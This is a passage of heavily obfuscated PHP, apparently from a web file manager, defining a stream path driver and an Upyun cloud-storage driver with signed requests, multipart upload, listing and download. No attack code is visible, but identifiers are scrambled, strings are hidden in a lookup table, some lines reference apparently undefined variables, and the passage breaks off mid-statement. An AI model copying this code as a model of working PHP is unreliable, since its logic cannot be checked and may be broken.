$¬¸æé[$ì°€¤¥Æ[649]] = $Ï¢ñ³×Ì; $Ã§¨Ïú½[$Ï¢ñ³×Ì][] =& $¬¸æé; if (count($Ã§¨Ïú½[$Ï¢ñ³×Ì]) > 1) { $¬¸æé[$ì°€¤¥Æ[646]] = !0; } Hook::trigger($ì°€¤¥Æ[650], $¬¸æé); } unset($¬¸æé); $ŞÎ„¥âÑ = array($ì°€¤¥Æ[649] => array($ì°€¤¥Æ[7], array_keys($Ã§¨Ïú½))); $ç‘û¼î = Model($ì°€¤¥Æ[651]); $ª‰õ£× = $ç‘û¼î->where($ŞÎ„¥âÑ)->select(); $ª‰õ£× = $ª‰õ£× ? $ª‰õ£× : array(); foreach ($ª‰õ£× as $òÇî”«») { if (!isset($Ã§¨Ïú½[$òÇî”«»[$ì°€¤¥Æ[649]]])) { continue; } $…òÄ¢ğ÷ = $Ã§¨Ïú½[$òÇî”«»[$ì°€¤¥Æ[649]]]; foreach ($…òÄ¢ğ÷ as &$¬¸æé) { $¬¸æé[$ì°€¤¥Æ[517]] = $òÇî”«»[$ì°€¤¥Æ[517]]; $¬¸æé[$ì°€¤¥Æ[646]] = !0; } unset($¬¸æé); } $£óîÒûÉ = array(); foreach ($æ™¦Äûò as $—’Ö«ä÷) { Hook::trigger($ì°€¤¥Æ[652], $—’Ö«ä÷); if (isset($—’Ö«ä÷[$ì°€¤¥Æ[646]]) && $—’Ö«ä÷[$ì°€¤¥Æ[646]]) { Hook::trigger($ì°€¤¥Æ[653], $—’Ö«ä÷); continue; } $‚¾ËßÏ = $Ñë¦úÄ->getPathInner($—’Ö«ä÷[$ì°€¤¥Æ[94]]); $›íìù = $ç‘û¼î->addFileMake($‚¾ËßÏ, $—’Ö«ä÷[$ì°€¤¥Æ[86]], $—’Ö«ä÷[$ì°€¤¥Æ[648]], $—’Ö«ä÷[$ì°€¤¥Æ[649]], $—’Ö«ä÷[$ì°€¤¥Æ[42]], $ş‹¥Œá”); Hook::trigger($ì°€¤¥Æ[653], $—’Ö«ä÷); if (!is_array($›íìù)) { continue; } $£óîÒûÉ[] = $›íìù; } $ç‘û¼î->addAll($£óîÒûÉ); $ŞÎ„¥âÑ = array($ì°€¤¥Æ[649] => array($ì°€¤¥Æ[7], array_keys($Ã§¨Ïú½))); $ª‰õ£× = $ç‘û¼î->where($ŞÎ„¥âÑ)->select(); $ª‰õ£× = $ª‰õ£× ? $ª‰õ£× : array(); foreach ($ª‰õ£× as $òÇî”«») { if (!isset($Ã§¨Ïú½[$òÇî”«»[$ì°€¤¥Æ[649]]])) { continue; } $†ã´·ªÅ =& $Ã§¨Ïú½[$òÇî”«»[$ì°€¤¥Æ[649]]]; foreach ($†ã´·ªÅ as &$¬¸æé) { $¬¸æé[$ì°€¤¥Æ[517]] = $òÇî”«»[$ì°€¤¥Æ[517]]; } unset($¬¸æé); } $Æˆ±…–È = array(); foreach ($æ™¦Äûò as $æÕÈ·ç) { $Æˆ±…–È[$æÕÈ·ç[$ì°€¤¥Æ[42]]] = $æÕÈ·ç; } return $Æˆ±…–È; } } define($_SERVER[ˆûùúÊ¯][654], $_SERVER[ˆûùúÊ¯][655]); $gcmfvkidwp = $_SERVER[ˆûùúÊ¯][656]; goto EÅ²‹ê …§; c½ŠŞÍ”Úª: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($½ğ™Ö¸, $›Ë³æÌ = 0) { parent::__construct(); $this->source = $½ğ™Ö¸; $this->sourceSize = $›Ë³æÌ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ö¯Å‘ş… = false) { return $this->sourceSize; } public function getContent($ºÂÂáÂƒ = false) { return $this->fileSubstr($ºÂÂáÂƒ, 0, $this->sourceSize); } public function fileSubstr($³¹€‹ú = false, $¸âµŞ­§ = 0, $æ‡µûÜü = 0) { if (!$æ‡µûÜü) { $æ‡µûÜü = $this->sourceSize; } $¬İÁÂ£ = $this->sourceSize - $¸âµŞ­§; if ($æ‡µûÜü >= $¬İÁÂ£) { $æ‡µûÜü = $¬İÁÂ£; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¸âµŞ­§, $æ‡µûÜü); } if ($this->sourceType == self::TYPE_FILE) { if ($æ‡µûÜü <= 0) { return $_SERVER[ˆûùúÊ¯][12]; } $÷­ñ‹ï = ftell($this->source); fseek_64($this->source, $÷­ñ‹ï + $¸âµŞ­§); $ÉƒÎí¶ = @fread($this->source, $æ‡µûÜü); fseek_64($this->source, $÷­ñ‹ï); return $ÉƒÎí¶; } } public function hashMd5($£ŠÒ¡Üî = false) { return md5($this->getContent()); } public static function hash($»¨Úß•Ç, $öœâ€—• = 0) { $½‚¼¸ëˆ = new PathDriverStream($»¨Úß•Ç, $öœâ€—•); return $½‚¼¸ëˆ->hashSimple($»¨Úß•Ç); } public static function md5($Âı€¬İê, $æ€„°ê = 0) { $çå¤ôõ = new PathDriverStream($Âı€¬İê, $æ€„°ê); return $çå¤ôõ->hashMd5($Âı€¬İê); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\x2f\57\166\60\56\x61\x70\151\x2e\x75\x70\x79\165\156\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ç«»Ë) { parent::__construct(); $this->_init($ç«»Ë); } public function _init($²Ï·›´Û) { $ÀùÉ£¼É =& $_SERVER[ˆûùúÊ¯]; foreach ($²Ï·›´Û as $Õƒ »Õ => $ø÷æ¤ó) { if (isset($this->{$Õƒ »Õ})) { $this->{$Õƒ »Õ} = $ø÷æ¤ó; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÀùÉ£¼É[1498] . LNG($ÀùÉ£¼É[1429])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¨¥¡Ë­¥, $ŠÁˆ­©ç = "\107\105\x54") { $š˜»ûÉ¯ =& $_SERVER[ˆûùúÊ¯]; $°°Ø¢ÖÖ = gmdate($š˜»ûÉ¯[1462]); $‡¸¸· = base64_encode(hash_hmac($š˜»ûÉ¯[1499], "{$ŠÁˆ­©ç}\46{$¨¥¡Ë­¥}\46{$°°Ø¢ÖÖ}", md5("{$this->userpass}"), !0)); $ø Ú›Ğ™ = array("\101\x75\164\150\157\162\151\172\x61\x74\x69\157\x6e\x3a\x55\x50\x59\x55\x4e\x20{$this->username}\72{$‡¸¸·}", "\x44\141\164\x65\x3a{$°°Ø¢ÖÖ}"); return $ø Ú›Ğ™; } public function ussRequest($ŸöÛÏÆ, $ÜõáÒ = "\107\105\x54", $¼ˆ ìØù = false, $Â÷ïâåÎ = false, $°ò—Ñß = false) { $Çšê¢ÊÖ =& $_SERVER[ˆûùúÊ¯]; $ŸöÛÏÆ = trim($ŸöÛÏÆ, $Çšê¢ÊÖ[8]); $Ø…¦¢“ä = "\57{$this->bucket}\x2f{$ŸöÛÏÆ}"; $ÏşÕ×ş¶ = $this->ussHeaders($Ø…¦¢“ä, $ÜõáÒ); if ($Â÷ïâåÎ) { $ÏşÕ×ş¶ = array_merge($ÏşÕ×ş¶, $Â÷ïâåÎ); } $ºÃñ¹é» = url_request($this->endpoint . $Ø…¦¢“ä, $ÜõáÒ, $¼ˆ ìØù, $ÏşÕ×ş¶, $°ò—Ñß); if (!$ºÃñ¹é») { return array($Çšê¢ÊÖ[1273] => !1, $Çšê¢ÊÖ[1263] => $Çšê¢ÊÖ[1500]); } if (strtolower($ÜõáÒ) == $Çšê¢ÊÖ[220] || in_array($ºÃñ¹é»[$Çšê¢ÊÖ[1273]], array($Çšê¢ÊÖ[265], $Çšê¢ÊÖ[1501]))) { $¼ˆ ìØù = $ºÃñ¹é»[$Çšê¢ÊÖ[1502]]; } else { $¼ˆ ìØù = json_decode($ºÃñ¹é»[$Çšê¢ÊÖ[1263]], !0); if (!$¼ˆ ìØù) { $¼ˆ ìØù = $ºÃñ¹é»[$Çšê¢ÊÖ[1263]]; } else { if (!$ºÃñ¹é»[$Çšê¢ÊÖ[810]] && isset($¼ˆ ìØù[$Çšê¢ÊÖ[1503]])) { $¼ˆ ìØù = $¼ˆ ìØù[$Çšê¢ÊÖ[1503]]; } } } return array($Çšê¢ÊÖ[1273] => $ºÃñ¹é»[$Çšê¢ÊÖ[810]], $Çšê¢ÊÖ[1263] => $¼ˆ ìØù); } public function mkfile($¼®¦¬Šœ, $‚ŞÙ©»µ = '', $ì†üÎŞ¼ = REPEAT_RENAME) { if ($this->setContent($¼®¦¬Šœ, $‚ŞÙ©»µ)) { return $this->getPathOuter($¼®¦¬Šœ); } return !1; } public function mkdir($õ×İÆ¦’, $±É­üÌ• = REPEAT_SKIP) { $á†§½ú =& $_SERVER[ˆûùúÊ¯]; $»Ø»í“ = trim($õ×İÆ¦’, $á†§½ú[8]); if ($this->_isFolder($»Ø»í“)) { return $this->getPathOuter($»Ø»í“); } $â¹Ğû¶ = array($á†§½ú[1504]); $ù‰’§§Á = $this->ussRequest($»Ø»í“, $á†§½ú[250], !1, $â¹Ğû¶); return $ù‰’§§Á[$á†§½ú[1273]] ? $this->getPathOuter($»Ø»í“) : !1; } public function copyFile($¼™ª—‰Ù, $ÁØ¾Ø¤·) { $áĞáıÕø =& $_SERVER[ˆûùúÊ¯]; $‡ÎÔ˜—Ø = array($áĞáıÕø[1505] . "\57{$this->bucket}\57{$¼™ª—‰Ù}", $áĞáıÕø[1506]); $ù”Ù°¡ = $this->ussRequest($ÁØ¾Ø¤·, $áĞáıÕø[252], !1, $‡ÎÔ˜—Ø); return $ù”Ù°¡[$áĞáıÕø[1273]] ? !0 : $this->getPathOuter($ÁØ¾Ø¤·); } public function moveFile($¦‘²•ùò, $ËĞÙÃ»¼) { $Œ£õ“³Ù =& $_SERVER[ˆûùúÊ¯]; $áì³†‡È = array($Œ£õ“³Ù[1507] . "\57{$this->bucket}\x2f{$¦‘²•ùò}", $Œ£õ“³Ù[1506]); $¹Âá¨¾ = $this->ussRequest($ËĞÙÃ»¼, $Œ£õ“³Ù[252], !1, $áì³†‡È); return $¹Âá¨¾[$Œ£õ“³Ù[1273]] ? !0 : $this->getPathOuter($ËĞÙÃ»¼); } public function delFile($¾ÚÙåÒœ) { $¸³£Â©š =& $_SERVER[ˆûùúÊ¯]; $ºåñ¯”¡ = $this->ussRequest($¾ÚÙåÒœ, $¸³£Â©š[1508]); return $ºåñ¯”¡[$¸³£Â©š[1273]] ? !0 : !1; } public function delFolder($Á¥İœ”û) { $£ç„¾‹Ø =& $_SERVER[ˆûùúÊ¯]; if (!$this->exist($Á¥İœ”û)) { return !0; } $this->listItemCache = !1; $ƒä™õªø = $°ÌÇÈÑë = array(); $this->fileList($Á¥İœ”û, $ƒä™õªø, $°ÌÇÈÑë, !0); $this->listItemCache = !0; foreach ($°ÌÇÈÑë as $¡ºŸí¼ü) { $ôó–§øÊ = $this->ussRequest($¡ºŸí¼ü[$£ç„¾‹Ø[42]], $£ç„¾‹Ø[1508]); if (!$ôó–§øÊ[$£ç„¾‹Ø[1273]]) { return !1; } } foreach ($ƒä™õªø as $÷ãüÄ¿¢) { $ôó–§øÊ = $this->ussRequest($÷ãüÄ¿¢, $£ç„¾‹Ø[1508]); if (!$ôó–§øÊ[$£ç„¾‹Ø[1273]]) { return !1; } } $ôó–§øÊ = $this->ussRequest($Á¥İœ”û, $£ç„¾‹Ø[1508]); return $ôó–§øÊ[$£ç„¾‹Ø[1273]]; } public function rename($¼öŒáÖæ, $ØŒ¸Ê) { if ($this->isFile($¼öŒáÖæ)) { $ØŒ¸Ê = get_path_father($¼öŒáÖæ) . $ØŒ¸Ê; return $this->moveFile($¼öŒáÖæ, $ØŒ¸Ê); } return $this->renameObject($¼öŒáÖæ, $ØŒ¸Ê); } public function fileInfo($‘©®ŠŒò, $Ã»¨ß = false, $ªÑÃççù = array()) { $êğàüÜù =& $_SERVER[ˆûùúÊ¯]; $×İ³ ß± = array($êğàüÜù[42] => $this->pathThis($‘©®ŠŒò), $êğàüÜù[94] => $this->getPathOuter($êğàüÜù[8] . $‘©®ŠŒò), $êğàüÜù[43] => $êğàüÜù[223], $êğàüÜù[86] => isset($ªÑÃççù[$êğàüÜù[86]]) ? $ªÑÃççù[$êğàüÜù[86]] : 0, $êğàüÜù[184] => $this->ext($‘©®ŠŒò)); if ($Ã»¨ß) { return $×İ³ ß±; } $×İ³ ß±[$êğàüÜù[224]] = $×İ³ ß±[$êğàüÜù[95]] = 0; $×İ³ ß±[$êğàüÜù[225]] = $×İ³ ß±[$êğàüÜù[226]] = !0; if (empty($ªÑÃççù)) { $ªÑÃççù = $this->objectMeta($‘©®ŠŒò); if (!$ªÑÃççù) { return $×İ³ ß±; } } $×İ³ ß±[$êğàüÜù[224]] = intval($ªÑÃççù[$êğàüÜù[1509]]); $×İ³ ß±[$êğàüÜù[95]] = intval($ªÑÃççù[$êğàüÜù[1510]]); $×İ³ ß±[$êğàüÜù[86]] = $ªÑÃççù[$êğàüÜù[86]]; return $×İ³ ß±; } public function folderInfo($‰Ü÷Õçº, $¿İÉªßî = false) { $Äü©ü— =& $_SERVER[ˆûùúÊ¯]; $¤Ô™’ò‘ = array($Äü©ü—[42] => $this->pathThis($‰Ü÷Õçº), $Äü©ü—[94] => $this->getPathOuter($Äü©ü—[8] . $‰Ü÷Õçº), $Äü©ü—[43] => $Äü©ü—[85]); if ($¿İÉªßî) { return $¤Ô™’ò‘; } $¤Ô™’ò‘[$Äü©ü—[224]] = $¤Ô™’ò‘[$Äü©ü—[95]] = 0; $¤Ô™’ò‘[$Äü©ü—[225]] = $¤Ô™’ò‘[$Äü©ü—[226]] = !0; if (empty($­”©œ±)) { $­”©œ± = $this->objectMeta($‰Ü÷Õçº); if (!$­”©œ±) { return $¤Ô™’ò‘; } } $¤Ô™’ò‘[$Äü©ü—[224]] = intval($­”©œ±[$Äü©ü—[1509]]); $¤Ô™’ò‘[$Äü©ü—[95]] = intval($­”©œ±[$Äü©ü—[1510]]); return $¤Ô™’ò‘; } private function listObjs($Ä”ÚÄĞ…, $¿ç™°×Ğ = 0, $ä¶¦·½Ê = 1000) { $ıàã›¼ò =& $_SERVER[ˆûùúÊ¯]; $µ“ı™» = array($ıàã›¼ò[1511], $ıàã›¼ò[1512] . $ä¶¦·½Ê); if ($¿ç™°×Ğ) { $µ“ı™»[] = $ıàã›¼ò[1513] . $¿ç™°×Ğ; } $—»î‚ = $this->ussRequest($Ä”ÚÄĞ…, $ıàã›¼ò[254], !1, $µ“ı™»); return !$—»î‚[$ıàã›¼ò[1273]] ? !1 : $—»î‚[$ıàã›¼ò[1263]]; } private function fileList($¤´ßÙ º, &$Ì—“í‰ç, &$…ˆ•¼êĞ, $ı¹‡ø = false) { $Æ¶®ºğ =& $_SERVER[ˆûùúÊ¯]; $±±Òé®˜ = $Æ¶®ºğ[12]; $í×©ÏÜæ = 1000; $…›Ç—§İ = rtrim($¤´ßÙ º, $Æ¶®ºğ[8]) . $Æ¶®ºğ[8]; while (!0) { check_abort(); $Ø¯°û•š = $this->listObjs($¤´ßÙ º, $±±Òé®˜, $í×©ÏÜæ); if (!$Ø¯°û•š) { return !1; } $±±Òé®˜ = isset($Ø¯°û•š[$Æ¶®ºğ[1514]]) ? $Ø¯°û•š[$Æ¶®ºğ[1514]] : $Æ¶®ºğ[12]; $ÜÃ“‡ È = isset($Ø¯°û•š[$Æ¶®ºğ[1515]]) ? $Ø¯°û•š[$Æ¶®ºğ[1515]] : array(); foreach ($ÜÃ“‡ È as $û•ã÷¤ä) { $ã‡”õ…¡ = $û•ã÷¤ä[$Æ¶®ºğ[43]] == $Æ¶®ºğ[85] ? !0 : !1; $òù™Ú‚æ = ltrim($…›Ç—§İ . $û•ã÷¤ä[$Æ¶®ºğ[42]], $Æ¶®ºğ[8]) . ($ã‡”õ…¡ ? $Æ¶®ºğ[8] : $Æ¶®ºğ[12]); $Ü×İ‡µë = array($Æ¶®ºğ[42] => $òù™Ú‚æ, $Æ¶®ºğ[43] => $ã‡”õ…¡ ? $Æ¶®ºğ[85] : $Æ¶®ºğ[223], $Æ¶®ºğ[86] => $û•ã÷¤ä[$Æ¶®ºğ[389]], $Æ¶®ºğ[1510] => $û•ã÷¤ä[$Æ¶®ºğ[1516]]); $this->cacheMethodInfoSet($òù™Ú‚æ, $ã‡”õ…¡, $Ü×İ‡µë); if ($ã‡”õ…¡) { $Ì—“í‰ç[] = $òù™Ú‚æ; if ($ı¹‡ø) { $this->fileList($òù™Ú‚æ, $Ì—“í‰ç, $…ˆ•¼êĞ, $ı¹‡ø); } continue; } $…ˆ•¼êĞ[] = $Ü×İ‡µë; } if (count($ÜÃ“‡ È) < $í×©ÏÜæ) { break; } } $this->cacheMethodInfoSet($¤´ßÙ º, !0); } public function listPath($¢Ğõ“úÏ, $äŠƒ«Ø¦ = false) { $ÕÀˆ÷²ã =& $_SERVER[ˆûùúÊ¯]; $øúŠ¦Šş = $É¶¬Ù¹ô = array(); $this->fileList($¢Ğõ“úÏ, $øúŠ¦Šş, $É¶¬Ù¹ô); foreach ($øúŠ¦Šş as $õüĞêš => $°Ç”¾Ë®) { $øúŠ¦Šş[$õüĞêš] = $this->folderInfo($°Ç”¾Ë®, $äŠƒ«Ø¦); } foreach ($É¶¬Ù¹ô as $õüĞêš => $°Ç”¾Ë®) { $É¶¬Ù¹ô[$õüĞêš] = $this->fileInfo($°Ç”¾Ë®[$ÕÀˆ÷²ã[42]], $äŠƒ«Ø¦, $°Ç”¾Ë®); } return array($ÕÀˆ÷²ã[92] => $øúŠ¦Šş, $ÕÀˆ÷²ã[93] => $É¶¬Ù¹ô); } public function has($¨Ï†ÉËõ, $ÑÌ¦Íˆµ = false, $ÃÖœÑÇ = true) { $Ş…ºàÇÉ =& $_SERVER[ˆûùúÊ¯]; $Õå˜øÕñ = $Ş…ºàÇÉ[12]; $€èÑ‘œ = 500; $Ááš = 0; $­üòñÕ = 0; $ƒö©¸š = rtrim($¨Ï†ÉËõ, $Ş…ºàÇÉ[8]) . $Ş…ºàÇÉ[8]; while (!0) { check_abort(); $ûÉç±ññ = $this->listObjs($¨Ï†ÉËõ, $Õå˜øÕñ, $€èÑ‘œ); if (!$ûÉç±ññ) { return !1; } $Õå˜øÕñ = isset($ûÉç±ññ[$Ş…ºàÇÉ[1514]]) ? $ûÉç±ññ[$Ş…ºàÇÉ[1514]] : $Ş…ºàÇÉ[12]; $çıì­¹¢ = isset($ûÉç±ññ[$Ş…ºàÇÉ[1515]]) ? $ûÉç±ññ[$Ş…ºàÇÉ[1515]] : array(); if (empty($çıì­¹¢)) { break; } $áÓ¼İÏ = array_filter($çıì­¹¢, function ($Ô­ËŞ) { $¾õÍöŠ =& $_SERVER[ˆûùúÊ¯]; return $Ô­ËŞ[$¾õÍöŠ[43]] == $¾õÍöŠ[85]; }); $­à¹¤½û = count($çıì­¹¢); $áÓ¼İÏ = count($áÓ¼İÏ); $­ÈªåıÕ = $­à¹¤½û - $áÓ¼İÏ; if ($ÑÌ¦Íˆµ) { $­üòñÕ += $áÓ¼İÏ; $Ááš += $­ÈªåıÕ; if ($­à¹¤½û < $€èÑ‘œ) { break; } continue; } if ($ÃÖœÑÇ) { if ($­ÈªåıÕ) { return !0; } } else { if ($áÓ¼İÏ) { return !0; } } if ($­à¹¤½û < $€èÑ‘œ) { break; } } if ($ÑÌ¦Íˆµ) { return array($Ş…ºàÇÉ[232] => $Ááš, $Ş…ºàÇÉ[233] => $­üòñÕ); } return !1; } public function listAll($¥ƒâ “ê) { $­ı³ã¡ =& $_SERVER[ˆûùúÊ¯]; $ìğîñÉ³ = $ûºŒ”˜ä = array(); $this->fileList($¥ƒâ “ê, $ìğîñÉ³, $ûºŒ”˜ä, !0); $Ü¸§ƒÎ = array_to_keyvalue($ûºŒ”˜ä, $­ı³ã¡[42]); foreach ($ìğîñÉ³ as $–‚à©Éµ) { if (is_string($–‚à©Éµ)) { $Ü¸§ƒÎ[$–‚à©Éµ] = array($­ı³ã¡[86] => 0); } } return $this->listAllFiles($¥ƒâ “ê, $Ü¸§ƒÎ); } public function canRead($å“ıÕ¼ä) { return $this->exist($å“ıÕ¼ä) ? !0 : !1; } public function canWrite($«Ñ»ü„é) { return $this->exist($«Ñ»ü„é) ? !0 : !1; } public function getContent($ï¡¡»ïß) { return $this->fileSubstr($ï¡¡»ïß, 0, -1); } public function setContent($ ªŒ•åû, $¡×æİ£ = '') { $¿ÅœúÛ =& $_SERVER[ˆûùúÊ¯]; if (!$¡×æİ£) { $İ³¥ĞÜ“ = $this->ussRequest($ ªŒ•åû, $¿ÅœúÛ[250]); return $İ³¥ĞÜ“[$¿ÅœúÛ[1273]]; } $Ÿë¨é—î = $this->tempFile($this->pathThis($ ªŒ•åû)); file_put_contents($Ÿë¨é—î, $¡×æİ£); if ($this->upload($ ªŒ•åû, $Ÿë¨é—î)) { $this->tempFileRemve($Ÿë¨é—î); return !0; } return !1; } public function fileSubstr($ªí­Ùê, $âÚ€ßƒÊ, $âÑ£Ä·») { $Ò­â¬á× =& $_SERVER[ˆûùúÊ¯]; if (!($ÀÃ»©í– = $this->link($ªí­Ùê))) { return !1; } $ş‰ÃŸÜØ = !1; if ($âÑ£Ä·» > 0) { $¸ì£¸¦ˆ = $âÚ€ßƒÊ + $âÑ£Ä·» - 1; $ş‰ÃŸÜØ = array($Ò­â¬á×[1477] . $âÚ€ßƒÊ . $Ò­â¬á×[438] . $¸ì£¸¦ˆ); } $é¬†ò“ = url_request($ÀÃ»©í–, $Ò­â¬á×[254], !1, $ş‰ÃŸÜØ); return $é¬†ò“[$Ò­â¬á×[810]] ? $é¬†ò“[$Ò­â¬á×[1263]] : !1; } public function upload($“Ã§ª—‚, $ø´Ê©’, $…•»« = false, $”¾¶ÎÉµ = REPEAT_REPLACE) { $…éĞÙß =& $_SERVER[ˆûùúÊ¯]; $¼’ÑïÅÜ = IO::size($ø´Ê©’); if ($¼’ÑïÅÜ <= 1024 * 1024 * 200) { $îèªÊãØ = array($…éĞÙß[1517] . $ø´Ê©’); $ƒ¬À¦‚ = $this->ussRequest($“Ã§ª—‚, $…éĞÙß[252], $îèªÊãØ); return $ƒ¬À¦‚[$…éĞÙß[1273]] ? $this->getPathOuter($“Ã§ª—‚) : !1; } $–µÇøïŠ = 1024 * 1024 * 10; $î¤…”ƒŒ = array($…éĞÙß[1518], $…éĞÙß[1519] . $¼’ÑïÅÜ, $…éĞÙß[1520], $…éĞÙß[1521] . $–µÇøïŠ); $ƒ¬À¦‚ = $this->ussRequest($“Ã§ª—‚, $…éĞÙß[252], !1, $î¤…”ƒŒ); if (!$ƒ¬À¦‚[$…éĞÙß[1273]]) { return !1; } $´½‡ù¥Ò = $ƒ¬À¦‚[$…éĞÙß[1263]]; $®©ıåŠÈ = 0; $º“¬¼±õ = $´½‡ù¥Ò[$…éĞÙß[1522]]; $ÜÆŞ—¼ = fopen($ø´Ê©’, $…éĞÙß[1426]); if (!$ÜÆŞ—¼) { return !1; } do { $Æ –«…Ê = $´½‡ù¥Ò[$…éĞÙß[1523]]; fseek_64($ÜÆŞ—¼, $®©ıåŠÈ); $Ê§‰Û»Û = fread($ÜÆŞ—¼, $Æ –«…Ê); $ ³‰Á´§ = 0; do { $ ³‰Á´§++; $´½‡ù¥Ò = $this->uploadPart($“Ã§ª—‚, $´½‡ù¥Ò, $Ê§‰Û»Û); } while (!$´½‡ù¥Ò && $ ³‰Á´§ < 3); if (!$´½‡ù¥Ò) { return !1; } $º“¬¼±õ = $´½‡ù¥Ò[$…éĞÙß[1522]]; $®©ıåŠÈ += $Æ –«…Ê; } while ($º“¬¼±õ != -1); fclose($ÜÆŞ—¼); $î¤…”ƒŒ = array($…éĞÙß[1524], $…éĞÙß[1525] . $´½‡ù¥Ò[$…éĞÙß[1526]], $…éĞÙß[1520]); $ƒ¬À¦‚ = $this->ussRequest($“Ã§ª—‚, $…éĞÙß[252], !1, $î¤…”ƒŒ); return $ƒ¬À¦‚[$…éĞÙß[1273]] ? $this->getPathOuter($Œ¹°–à±) : !1; } private function uploadPart($¹öãËó›, $¬Ò¦‚», &$Æ©Ãñ¾) { $‚«Ûöù” =& $_SERVER[ˆûùúÊ¯]; $Œ¢¯£¨Æ = array($‚«Ûöù”[1527], $‚«Ûöù”[1525] . $¬Ò¦‚»[$‚«Ûöù”[1526]], $‚«Ûöù”[1528] . $¬Ò¦‚»[$‚«Ûöù”[1522]], $‚«Ûöù”[152] . $¬Ò¦‚»[$‚«Ûöù”[1523]]); $¿‡Ìåº¸ = $this->ussRequest($¹öãËó›, $‚«Ûöù”[252], $Æ©Ãñ¾, $Œ¢¯£¨Æ); return !$¿‡Ìåº¸[$‚«Ûöù”[1273]] ? $¿‡Ìåº¸[$‚«Ûöù”[1273]] : $¿‡Ìåº¸[$‚«Ûöù”[1263]]; } public function uploadFormData($¯ªÁĞÌ, $ì­™şã = 3600) { return $this->uploadPolicy($¯ªÁĞÌ, $ì­™şã); } public function multiUploadFormData($’‡«Û, $ĞÁ¿×Òç = 3600) { $‚üÁœ =& $_SERVER[ˆûùúÊ¯]; $Æ½šÎ•Ê = (int) $GLOBALS[$‚üÁœ[7]][$‚üÁœ[86]]; return $this->uploadPolicy($’‡«Û, $ĞÁ¿×Òç, $Æ½šÎ•Ê); } private function uploadPolicy($æß¯®Ì´, $äœµŞî¡ = 3600, $€õáœê = 0) { $õ…¥õåå =& $_SERVER[ˆûùúÊ¯]; $ş¿è‚âõ = $õ…¥õåå[8] . $this->bucket; $”ø¸–ãÌ = gmdate($õ…¥õåå[1462]); $ºµ‹¬®Ó = array($õ…¥õåå[1529] => $this->bucket, $õ…¥õåå[1530] => $æß¯®Ì´, $õ…¥õåå[1531] => time() + $äœµŞî¡, $õ…¥õåå[1532] => $”ø¸–ãÌ); if ($€õáœê) { $ºµ‹¬®Ó[$õ…¥õåå[1443]] = $€õáœê; } $‰áçİ¦ = base64_encode(json_encode($ºµ‹¬®Ó)); $ª”…Âà• = base64_encode(hash_hmac($õ…¥õåå[1499], "\x50\x4f\123\124\46{$ş¿è‚âõ}\x26{$”ø¸–ãÌ}\46{$‰áçİ¦}", md5("{$this->userpass}"), !0)); $ÃğÍ£ªŠ = array($õ…¥õåå[284] => $‰áçİ¦, $õ…¥õåå[1533] => "\125\x50\131\125\x4e\40{$this->username}\72{$ª”…Âà•}", $õ…¥õåå[205] => $this->endpoint . $ş¿è‚âõ); return $ÃğÍ£ªŠ; } public function download($· ÈÇ, $®¥‹Ë×) { $Õ´íŸÌà = IO::getPathInner(IO::mkfile($®¥‹Ë×)); if (!($ÜšƒˆÈ» = $this->link($· ÈÇ))) { return !1; } $¡ÀÖÏ = 0; $¹¿ıÕ‚š = 1024 * 200; $”†ÍÁ‹İ = fopen($Õ´íŸÌà, $_SERVER[ˆûùúÊ¯][1483]); while (!0) { $›Óùò‘ = $this->fileSubstr($· ÈÇ, $¡ÀÖÏ, $¹¿ıÕ‚š); if ($›Óùò‘ === !1) { return !1; } fwrite($”†ÍÁ‹İ, $›Óùò‘); $¡ÀÖÏ += $¹¿ıÕ‚š; if (strlen($›Óùò‘) < $¹¿ıÕ‚š) { break; } } fclose($”†ÍÁ‹İ); return $®¥‹Ë×; } public function link($¿á˜éâ³, $Ôìº²¾Æ = array()) { $„‚«ì‘© =& $_SERVER[ˆûùúÊ¯]; $¿á˜éâ³ = trim($¿á˜éâ³, $„‚«ì‘©[8]); if (!empty($this->token)) { $©àéÅİé = strtotime(date($„‚«ì‘©[1534])); $µô©¶òË = substr(md5($this->token . $„‚«ì‘©[336] . $©àéÅİé . $„‚«ì‘©[1535] . $¿á˜éâ³), 12, 8) . $©àéÅİé; $Ôìº²¾Æ[] = $„‚«ì‘©[1536] . $µô©¶òË; } $Ù•¢ë˜Š = !empty($Ôìº²¾Æ) ? $„‚«ì‘©[83] . implode($„‚«ì‘©[336], $Ôìº²¾Æ) : $„‚«ì‘©[12]; return $this->getHost() . $„‚«ì‘©[8] . $¿á˜éâ³ . $Ù•¢ë˜Š; } public function fileOut($Êòê„˜, $şØé¶ºß = false, $ÂÑ“Ï–ï = false, $Ì·¨¶¯• = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Êòê„˜, $şØé¶ºß, $ÂÑ“Ï–ï, $Ì·¨¶¯•); } if (!$ÂÑ“Ï–ï) { $ÂÑ“Ï–ï = $this->pathThis($Êòê„˜); } $€û·Ä» = $şØé¶ºß ? array($_SERVER[ˆûùúÊ¯][1537] . rawurlencode($ÂÑ“Ï–ï)) : array(); $” ©ôË­ = $this->link($Êòê„˜, $€û·Ä»); $this->fileOutLink($” ©ôË­); } public function fileOutServer($ïÚô×Ô, $ßÛ”Ğ¡ï = false, $İÌ®ª¦» = false, $ËĞ´¿Â = '') { parent::fileOut($ïÚô×Ô, $ßÛ”Ğ¡ï, $İÌ®ª¦», $ËĞ´¿Â); } public function fileOutImage($÷œŒëßñ, $á¡›ªÉú = 250) { $ê¸Û—Ö± = $this->link($÷œŒëßñ . $_SERVER[ˆûùúÊ¯][1538] . $á¡›ªÉú); $this->fileOutLink($ê¸Û—Ö±); } public function fileOutImageServer($‚È§Ò, $ãäûÉœˆ = 250) { parent::fileOutImage($‚È§Ò, $ãäûÉœˆ); } public function hashMd5($¦Õ¯ºè) { $ªˆğªÛ =& $_SERVER[ˆûùúÊ¯]; $ŠöÛ°â‚ = $this->_objectMeta($¦Õ¯ºè); return isset($ŠöÛ°â‚[$ªˆğªÛ[237]]) ? 